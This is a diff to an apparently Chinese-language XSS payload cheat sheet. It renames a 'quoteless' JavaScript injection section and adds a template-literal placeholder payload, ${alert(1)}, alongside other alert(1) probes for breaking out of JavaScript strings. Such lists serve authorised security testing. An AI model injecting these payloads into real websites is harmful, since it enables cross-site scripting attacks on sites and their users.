@@ -61,13 +61,18 @@ javascript:alert(1)
 '}alert(1)%0A{'
 \'}alert(1);{//
 ```
-**9.Javascript Injection - Quoteless (javscript注入-)**
+**9.Javascript Injection - Quoteless (javscript注入-无变量名)**
 
 当输入的payload在同一行javascript代码中有多次反射时使用。<br>
 第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>
 ```
 /alert(1)//\
 /alert(1)}//\
+```
+**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)**
+当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。
+```
+${alert(1)}
 ```
 
 ## 致谢
